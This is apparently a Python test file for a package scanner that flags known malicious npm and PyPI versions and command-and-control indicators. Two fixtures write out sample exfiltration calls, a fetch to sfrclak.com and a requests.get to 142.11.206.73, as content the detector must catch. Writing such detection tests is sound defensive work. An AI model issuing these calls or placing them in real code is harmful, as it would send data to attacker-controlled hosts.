"""Tests for IOC checker scanner."""

import tempfile
from pathlib import Path

from app.scanners.ioc_checker import IOCScanner
from app.schemas.package import PackageInfo


def _make_package(name: str = "safe-pkg", version: str = "1.0.0", registry: str = "npm") -> PackageInfo:
    return PackageInfo(name=name, version=version, registry=registry)


async def test_known_malicious_npm_package():
    scanner = IOCScanner()
    result = await scanner.scan(_make_package("axios", "1.14.1"), [])
    assert result.verdict == "fail"
    assert result.confidence == 1.0
    assert "known malicious" in result.details.lower()


async def test_known_malicious_pypi_package():
    scanner = IOCScanner()
    result = await scanner.scan(_make_package("litellm", "1.82.7", "pypi"), [])
    assert result.verdict == "fail"


async def test_safe_package_passes():
    scanner = IOCScanner()
    result = await scanner.scan(_make_package("express", "4.18.2"), [])
    assert result.verdict == "pass"


async def test_c2_domain_in_content():
    scanner = IOCScanner()
    f = Path(tempfile.mktemp(suffix=".js"))
    f.write_text("fetch('https://sfrclak.com/data');")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
        assert "sfrclak.com" in result.details
    finally:
        f.unlink(missing_ok=True)


async def test_c2_ip_in_content():
    scanner = IOCScanner()
    f = Path(tempfile.mktemp(suffix=".py"))
    f.write_text("requests.get('http://142.11.206.73/collect')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
        assert "142.11.206.73" in result.details
    finally:
        f.unlink(missing_ok=True)


async def test_clean_content_passes():
    scanner = IOCScanner()
    f = Path(tempfile.mktemp(suffix=".js"))
    f.write_text("console.log('hello');")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)
